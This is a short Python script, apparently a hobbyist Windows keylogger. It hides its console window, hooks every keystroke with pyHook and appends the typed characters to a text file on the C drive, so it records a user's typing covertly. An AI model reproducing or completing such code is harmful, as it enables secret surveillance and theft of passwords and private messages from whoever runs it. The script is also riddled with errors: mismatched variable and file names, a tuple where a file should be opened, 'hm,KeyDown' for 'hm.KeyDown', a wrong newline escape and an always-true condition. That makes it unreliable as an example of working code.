#importing classes
import win32api
import win32console
import win32gui
import pythoncom, pyHook #<-- connect you with the actual keybord

#initializing a script that run behid the screen
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeybordEvent(evet):

    if event.Ascii==5:

        _exit(1)

    if event.Ascii !=0 or 8: #<--- Condition

        f = open('c:\output.text','r+') #<--- Creates The file on the C drive

        buffer = f.read()
        f.close() #close thr file when user stops typing

       #open a text file that the file was saved
        f = ('c:\output.txt','w')

        keylogs = chr(event.Ascii)
       #if the Ascii character is equal to 13 start a new line.
        if event.Ascii == 13:
            keylogs = '/n'

        buffer += keylogs
     
        f.write(buffer)
        #close the text file
        f.close()
#create  a hook for the manager Object 
hm = pyHook.HookManager()
hm,KeyDown = OnKeybordEvent

#set the hook
Hm.HookKeyboard()

#wait Forever
pythoncom.PumpMessages()

    


